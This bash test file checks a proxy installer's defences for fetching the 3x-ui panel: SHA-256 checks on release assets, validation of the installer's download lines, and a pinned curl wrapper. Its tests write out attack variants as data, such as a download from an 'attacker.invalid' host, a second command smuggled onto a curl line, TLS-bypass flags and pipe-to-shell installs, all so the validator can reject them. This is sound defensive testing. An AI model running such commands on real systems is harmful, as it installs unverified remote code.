#!/usr/bin/env bash

set -uo pipefail
# shellcheck source=test_helper.sh
source "$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/test_helper.sh"

TEST_SANDBOX=$(make_test_temp_dir)
trap 'rm -rf -- "$TEST_SANDBOX"' EXIT

CONFIG_DIR=$TEST_SANDBOX/config
STATE_FILE=$CONFIG_DIR/state.env
CERT_DIR=$CONFIG_DIR/certs
LOG_FILE=$TEST_SANDBOX/one-key-proxy.log
BACKUP_DIR=$TEST_SANDBOX/backups
# shellcheck source=../lib/common.sh
source "$PROJECT_ROOT/lib/common.sh"

REPOSITORY=MHSanaei/3x-ui
TAG=v9.8.7
COMMIT=0123456789abcdef0123456789abcdef01234567
ARCH=amd64
ASSET_NAME=x-ui-linux-amd64.tar.gz
ASSET_URL="https://github.com/${REPOSITORY}/releases/download/${TAG}/${ASSET_NAME}"

release_document() {
  local digest=$1 url=${2:-$ASSET_URL} duplicate=${3:-false}
  jq -cn --arg tag "$TAG" --arg name "$ASSET_NAME" --arg url "$url" \
    --arg digest "$digest" --argjson duplicate "$duplicate" '
    {
      tag_name: $tag,
      draft: false,
      prerelease: false,
      assets: ([{
        name: $name,
        state: "uploaded",
        size: 123,
        browser_download_url: $url,
        digest: $digest
      }] + (if $duplicate then [{
        name: $name,
        state: "uploaded",
        size: 123,
        browser_download_url: $url,
        digest: $digest
      }] else [] end))
    }'
}

write_installer_fixture() {
  local destination=$1
  printf '%s\n' \
    '#!/usr/bin/env bash' \
    'xui_folder="${XUI_MAIN_FOLDER:=/usr/local/x-ui}"' \
    'arch() {' \
    '  case "$(uname -m)" in' \
    "    x86_64 | x64 | amd64) echo 'amd64' ;;" \
    "    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;" \
    '  esac' \
    '}' \
    '_install_xui_service_unit() {' \
    '  local source="$1"' \
    '  local source_is_url="$2"' \
    '  local temp_file=/tmp/service-unit' \
    '  [[ $source_is_url == true ]] || return 1' \
    '  curl -fLRo "$temp_file" "$source"' \
    '}' \
    'install_acme_one() {' \
    '  curl -s https://get.acme.sh | sh' \
    '}' \
    'install_acme_two() {' \
    '  curl -s https://get.acme.sh | sh' \
    '}' \
    'install_x-ui() {' \
    '  if [ $# == 0 ]; then' \
    '    curl -fLR -o ${xui_folder}-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz' \
    '  else' \
    '    tag_version=$1' \
    '    url="https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz"' \
    '    curl -fLR -o ${xui_folder}-linux-$(arch).tar.gz ${url}' \
    '  fi' \
    '  local xui_script_temp=/tmp/x-ui-script' \
    '  local xui_rc_temp=/tmp/x-ui-rc' \
    '  curl -fLRo "${xui_script_temp}" https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh' \
    '  curl -fLRo "${xui_rc_temp}" https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.rc' \
    '  case distro in' \
    '    debian) service_unit_url="https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.service.debian" ;;' \
    '    arch) service_unit_url="https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.service.arch" ;;' \
    '    *) service_unit_url="https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.service.rhel" ;;' \
    '  esac' \
    '  _install_xui_service_unit "$service_unit_url" "true"' \
    '}' \
    'install_x-ui $1' >"$destination"
  chmod 0600 "$destination"
}

replace_fixture_literal() {
  local source=$1 destination=$2 needle=$3 replacement=$4
  awk -v needle="$needle" -v replacement="$replacement" '
    !changed && (position = index($0, needle)) != 0 {
      $0 = substr($0, 1, position - 1) replacement substr($0, position + length(needle))
      changed = 1
    }
    { print }
    END { if (!changed) exit 2 }
  ' "$source" >"$destination"
  chmod 0600 "$destination"
}

create_fake_curl() {
  local fake_bin=$1
  mkdir -p "$fake_bin"
  apply_fake_curl_script "$fake_bin/curl"
  chmod 0755 "$fake_bin/curl"
}

apply_fake_curl_script() {
  local destination=$1
  printf '%s\n' \
    '#!/usr/bin/env bash' \
    'set -euo pipefail' \
    ': "${FAKE_CURL_AUDIT:?}" "${FAKE_CURL_PAYLOAD:?}"' \
    'printf "%s\n" "---" "$@" >>"$FAKE_CURL_AUDIT"' \
    'output=""' \
    'expect_output=false' \
    'for argument in "$@"; do' \
    '  if [[ $expect_output == true ]]; then' \
    '    output=$argument' \
    '    expect_output=false' \
    '    continue' \
    '  fi' \
    '  case $argument in' \
    '    -o|--output) expect_output=true ;;' \
    '    --output=*) output=${argument#--output=} ;;' \
    '    -o?*) output=${argument#-o} ;;' \
    '  esac' \
    'done' \
    '[[ -z $output ]] || cp -- "$FAKE_CURL_PAYLOAD" "$output"' >"$destination"
}

test_release_metadata_requires_one_exact_digested_asset() {
  local digest document
  digest="sha256:$(printf 'a%.0s' {1..64})"
  document=$(release_document "$digest")
  assert_success okp_xui_release_asset_from_json "$REPOSITORY" "$TAG" "$ARCH" "$document"
  assert_eq "$ASSET_NAME" "$OKP_XUI_RELEASE_ASSET_NAME"
  assert_eq "$ASSET_URL" "$OKP_XUI_RELEASE_ASSET_URL"
  assert_eq "${digest#sha256:}" "$OKP_XUI_RELEASE_ASSET_SHA256"
  assert_eq 123 "$OKP_XUI_RELEASE_ASSET_SIZE"

  assert_failure okp_xui_release_asset_from_json "$REPOSITORY" "$TAG" "$ARCH" \
    "$(release_document 'sha256:not-a-digest')"
  assert_failure okp_xui_release_asset_from_json "$REPOSITORY" "$TAG" "$ARCH" \
    "$(release_document "$digest" 'https://example.invalid/x-ui.tar.gz')"
  assert_failure okp_xui_release_asset_from_json "$REPOSITORY" "$TAG" "$ARCH" \
    "$(release_document "$digest" "$ASSET_URL" true)"
}

test_installer_downloader_shape_accepts_expected_fixture() {
  local installer=$TEST_SANDBOX/installer-valid.sh
  write_installer_fixture "$installer"
  assert_success okp_xui_validate_pinned_installer_downloaders "$installer" \
    "$REPOSITORY" "$TAG" "$ARCH"
  assert_success okp_xui_validate_pinned_installer_downloaders "$installer" \
    "$REPOSITORY" "$TAG" arm64
}

test_installer_downloader_shape_rejects_bypasses() {
  local valid=$TEST_SANDBOX/installer-bypass-valid.sh
  local absolute=$TEST_SANDBOX/installer-absolute-curl.sh wget=$TEST_SANDBOX/installer-wget.sh
  local reset_path=$TEST_SANDBOX/installer-reset-path.sh insecure=$TEST_SANDBOX/installer-insecure.sh
  local clean_env=$TEST_SANDBOX/installer-clean-env.sh
  write_installer_fixture "$valid"
  replace_fixture_literal "$valid" "$absolute" \
    'curl -fLRo "${xui_script_temp}"' '/usr/bin/curl -fLRo "${xui_script_temp}"'
  assert_failure okp_xui_validate_pinned_installer_downloaders "$absolute" \
    "$REPOSITORY" "$TAG" "$ARCH"

  replace_fixture_literal "$valid" "$wget" \
    'curl -fLRo "${xui_script_temp}"' 'wget -O "${xui_script_temp}"'
  assert_failure okp_xui_validate_pinned_installer_downloaders "$wget" \
    "$REPOSITORY" "$TAG" "$ARCH"

  awk 'NR == 2 { print "PATH=/usr/bin" } { print }' "$valid" >"$reset_path"
  chmod 0600 "$reset_path"
  assert_failure okp_xui_validate_pinned_installer_downloaders "$reset_path" \
    "$REPOSITORY" "$TAG" "$ARCH"

  replace_fixture_literal "$valid" "$insecure" \
    'curl -fLRo "${xui_script_temp}"' 'curl -kfLRo "${xui_script_temp}"'
  assert_failure okp_xui_validate_pinned_installer_downloaders "$insecure" \
    "$REPOSITORY" "$TAG" "$ARCH"

  replace_fixture_literal "$valid" "$clean_env" \
    'curl -fLRo "${xui_script_temp}"' 'env -i curl -fLRo "${xui_script_temp}"'
  assert_failure okp_xui_validate_pinned_installer_downloaders "$clean_env" \
    "$REPOSITORY" "$TAG" "$ARCH"
}

test_installer_downloader_shape_rejects_changed_resources() {
  local valid=$TEST_SANDBOX/installer-resource-valid.sh
  local output=$TEST_SANDBOX/installer-output.sh raw=$TEST_SANDBOX/installer-raw.sh
  local extra=$TEST_SANDBOX/installer-extra-curl.sh same_line=$TEST_SANDBOX/installer-same-line-curl.sh
  local resolved=$TEST_SANDBOX/installer-resolved-curl.sh
  write_installer_fixture "$valid"
  replace_fixture_literal "$valid" "$output" \
    '-o ${xui_folder}-linux-$(arch).tar.gz ${url}' \
    '-o /tmp/x-ui-unverified.tar.gz ${url}'
  assert_failure okp_xui_validate_pinned_installer_downloaders "$output" \
    "$REPOSITORY" "$TAG" "$ARCH"

  replace_fixture_literal "$valid" "$raw" \
    'https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh' \
    'https://raw.githubusercontent.com/MHSanaei/3x-ui/main/install.sh'
  assert_failure okp_xui_validate_pinned_installer_downloaders "$raw" \
    "$REPOSITORY" "$TAG" "$ARCH"

  awk '/^install_x-ui \$1$/ { print "curl -fL -o ${xui_folder}-linux-$(arch).tar.gz https://attacker.invalid/x.tgz" } { print }' \
    "$valid" >"$extra"
  chmod 0600 "$extra"
  assert_failure okp_xui_validate_pinned_installer_downloaders "$extra" \
    "$REPOSITORY" "$TAG" "$ARCH"

  replace_fixture_literal "$valid" "$same_line" \
    'curl -fLRo "${xui_script_temp}" https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh' \
    'curl -fLRo "${xui_script_temp}" https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh; curl -fsSL https://attacker.invalid/x.tgz > ${xui_folder}-linux-$(arch).tar.gz'
  assert_failure okp_xui_validate_pinned_installer_downloaders "$same_line" \
    "$REPOSITORY" "$TAG" "$ARCH"

  replace_fixture_literal "$valid" "$resolved" \
    'curl -fLRo "${xui_script_temp}"' \
    '"$(type -P -a curl | tail -n 1)" -fLRo "${xui_script_temp}"'
  assert_failure okp_xui_validate_pinned_installer_downloaders "$resolved" \
    "$REPOSITORY" "$TAG" "$ARCH"
}

prepare_fixture() {
  local fake_bin=$TEST_SANDBOX/fake-bin
  FAKE_CURL_PAYLOAD=$TEST_SANDBOX/release-asset
  FAKE_CURL_AUDIT=$TEST_SANDBOX/curl-audit
  printf '%s\n' 'verified release archive fixture' >"$FAKE_CURL_PAYLOAD"
  : >"$FAKE_CURL_AUDIT"
  export FAKE_CURL_PAYLOAD FAKE_CURL_AUDIT
  create_fake_curl "$fake_bin"
  FIXTURE_DIGEST=$(_okp_xui_sha256_file "$FAKE_CURL_PAYLOAD")
  ORIGINAL_PATH=$PATH
  PATH="${fake_bin}:/usr/bin:/bin"
}

test_prepare_rejects_wrong_download_digest() {
  local workdir=$TEST_SANDBOX/wrong-digest output_dir=$TEST_SANDBOX/wrong-output
  prepare_fixture
  mkdir -p "$workdir" "$output_dir"
  assert_failure okp_prepare_pinned_xui_download "$REPOSITORY" "$TAG" "$COMMIT" \
    "$ARCH" "$(printf '0%.0s' {1..64})" "$workdir" "$output_dir/$ASSET_NAME"
  assert_file_not_exists "$workdir/bin/curl"
  PATH=$ORIGINAL_PATH
}

test_pinned_wrapper_copies_asset_and_rewrites_main() {
  local workdir=$TEST_SANDBOX/prepared output_dir=$TEST_SANDBOX/output
  local output_file delegate_output audit
  prepare_fixture
  mkdir -p "$workdir" "$output_dir"
  output_file=$output_dir/$ASSET_NAME
  assert_success okp_prepare_pinned_xui_download "$REPOSITORY" "$TAG" "$COMMIT" \
    "$ARCH" "$FIXTURE_DIGEST" "$workdir" "$output_file" "$output_dir"
  assert_file_exists "$OKP_XUI_PINNED_CURL"
  assert_file_exists "$OKP_XUI_VERIFIED_ASSET"
  assert_eq 700 "$(file_mode "$OKP_XUI_PINNED_CURL")"
  assert_eq 600 "$(file_mode "$OKP_XUI_VERIFIED_ASSET")"

  audit=$(<"$FAKE_CURL_AUDIT")
  assert_contains "$audit" '--disable'
  assert_contains "$audit" '--noproxy'
  assert_contains "$audit" '--proto'
  assert_contains "$audit" '=https'
  assert_contains "$audit" '--proto-redir'
  assert_contains "$audit" '--tlsv1.2'
  assert_contains "$audit" "$ASSET_URL"
  assert_contains "$audit" "https://raw.githubusercontent.com/${REPOSITORY}/${COMMIT}/x-ui.sh"
  [[ $audit != *"/${REPOSITORY}/main/"* ]] || fail 'movable main URL was predownloaded'

  assert_success "$OKP_XUI_PINNED_CURL" -L -o "$output_file" "$ASSET_URL"
  cmp "$FAKE_CURL_PAYLOAD" "$output_file"
  assert_eq 600 "$(file_mode "$output_file")"

  : >"$FAKE_CURL_AUDIT"
  delegate_output=$output_dir/x-ui-temp.$$
  assert_success "$OKP_XUI_PINNED_CURL" -fsSL \
    "--url=https://raw.githubusercontent.com/${REPOSITORY}/main/x-ui.sh" -o "$delegate_output"
  audit=$(<"$FAKE_CURL_AUDIT")
  assert_eq '' "$audit" 'fixed raw helper must be served from the private cache'
  cmp "$FAKE_CURL_PAYLOAD" "$delegate_output"

  : >"$FAKE_CURL_AUDIT"
  assert_failure "$OKP_XUI_PINNED_CURL" -L -o "$output_file" \
    "https://github.com/${REPOSITORY}/releases/download/v9.8.8/${ASSET_NAME}"
  assert_eq '' "$(<"$FAKE_CURL_AUDIT")" 'changed official asset must not reach real curl'
  assert_failure "$OKP_XUI_PINNED_CURL" -fsSL \
    "https://raw.githubusercontent.com/${REPOSITORY}/dev/x-ui.sh" -o "$delegate_output"
  assert_eq '' "$(<"$FAKE_CURL_AUDIT")" 'unfixed raw URL must not reach real curl'
  assert_failure "$OKP_XUI_PINNED_CURL" -fsSL \
    "https://RAW.GITHUBUSERCONTENT.COM/${REPOSITORY}/main/x-ui.sh" -o "$delegate_output"
  assert_failure "$OKP_XUI_PINNED_CURL" -fsSL \
    "https://raw.githubusercontent.com/${REPOSITORY}/main/../dev/x-ui.sh" -o "$delegate_output"
  assert_failure "$OKP_XUI_PINNED_CURL" --next -fsSL https://get.acme.sh
  assert_failure "$OKP_XUI_PINNED_CURL" -k -fsSL https://get.acme.sh
  assert_failure "$OKP_XUI_PINNED_CURL" --cacert /tmp/untrusted.pem -fsSL https://get.acme.sh
  assert_failure "$OKP_XUI_PINNED_CURL" -L -o "$output_file" \
    https://attacker.invalid/x-ui-linux-amd64.tar.gz
  PATH=$ORIGINAL_PATH
}

run_test 'release metadata selects one exact asset with SHA-256' \
  test_release_metadata_requires_one_exact_digested_asset
run_test 'installer downloader shape accepts the pinned curl contract' \
  test_installer_downloader_shape_accepts_expected_fixture
run_test 'installer downloader shape rejects curl and wget bypasses' \
  test_installer_downloader_shape_rejects_bypasses
run_test 'installer downloader shape rejects changed resources' \
  test_installer_downloader_shape_rejects_changed_resources
run_test 'verified release preparation rejects a wrong digest' \
  test_prepare_rejects_wrong_download_digest
run_test 'pinned curl wrapper copies and rewrites securely' \
  test_pinned_wrapper_copies_asset_and_rewrites_main

finish_tests
